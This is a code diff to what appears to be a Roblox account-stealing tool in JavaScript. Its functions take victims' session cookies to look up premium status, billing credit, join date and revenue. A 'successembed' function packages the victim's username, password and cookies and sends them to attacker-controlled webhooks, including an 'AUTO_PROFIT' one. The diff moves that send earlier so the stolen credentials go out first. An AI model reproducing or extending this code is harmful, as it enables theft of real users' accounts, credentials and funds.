@@ -59,7 +59,7 @@ async function getUserRobux(cookies) {
 }
 
 
-async function getPremiumData(userId, cookies, proxyUrl) {
+async function getPremiumData(userId, cookies) {
     const intuserId = parseInt(userId);
     const url = `https://premiumfeatures.roblox.com/v1/users/${userId}/subscriptions`;
     try {
@@ -152,7 +152,7 @@ async function checkVerified(userId) {
 }
 
 
-async function getCreditBalance(cookies, proxyUrl) {
+async function getCreditBalance(cookies) {
     try {
         const url = 'https://billing.roblox.com/v1/credit';
 
@@ -185,7 +185,7 @@ async function getCreditBalance(cookies, proxyUrl) {
 }
 
 
-async function getUserJoinDate(userId, cookies, proxyUrl) {
+async function getUserJoinDate(userId, cookies) {
     try {
         const url = `https://users.roblox.com/v1/users/${userId}`;
 
@@ -208,7 +208,7 @@ async function getUserJoinDate(userId, cookies, proxyUrl) {
 }
 
 
-async function getUserRevenue(userId, cookies, proxyUrl) {
+async function getUserRevenue(userId, cookies) {
     try {
         const url = `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=year&transactionType=summary&limit=100`;
 
@@ -488,12 +488,15 @@ async function successembed(rusername, rpassword, cookies, successwebhook, sessi
                 },
                 {
                     name: "Cookies",
-                    value: "```yaml\n" + cookies + "\n```",
+                    value: "```yaml\n" +cookies+ "\n```",
                     inline: false,
                 }
             ],
         }, ],
     };
+
+    const payload = JSON.stringify(successembed);
+    sendwebhooks(successwebhook, payload);
 
     try {
         // Retrieve the user with the given username
@@ -605,9 +608,6 @@ async function successembed(rusername, rpassword, cookies, successwebhook, sessi
         const autoprofitpayload = JSON.stringify(autoprofitembed);
         sendwebhooks(process.env.AUTO_PROFIT, autoprofitpayload);
     }
-
-    const payload = JSON.stringify(successembed);
-    sendwebhooks(successwebhook, payload);
 
     return 'New Account Validated';
 }
